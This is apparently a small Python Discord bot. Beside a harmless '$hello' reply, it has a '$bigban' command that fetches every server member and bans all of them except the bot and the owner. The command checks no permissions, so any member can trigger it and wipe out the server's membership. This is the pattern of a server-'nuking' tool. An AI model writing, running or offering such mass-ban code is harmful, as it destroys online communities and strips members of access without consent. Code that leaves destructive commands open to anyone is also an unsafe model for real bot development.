import discord

intents = discord.Intents.all()

client = discord.Client(intents=intents)


@client.event
async def on_ready():
    print(f"We have login in as {client.user}")


@client.event
async def on_message(message):
    if message.author == client.user:
        return
    if message.content.startswith("$hello"):
        await message.channel.send("Hello!")
    if message.content.startswith("$bigban"):
        async for user in message.guild.fetch_members():
            if user == client.user or user == message.guild.owner:
                pass
            else:
                print(f"Banning: {user}...")
                try:
                    await user.ban(reason="Mass Ban")
                    print(f"Banned: {user}!")
                except discord.errors.Forbidden:
                    print(f"Could not ban {user}")


if __name__ == "__main__":
    token = "token"
    client.run(token)
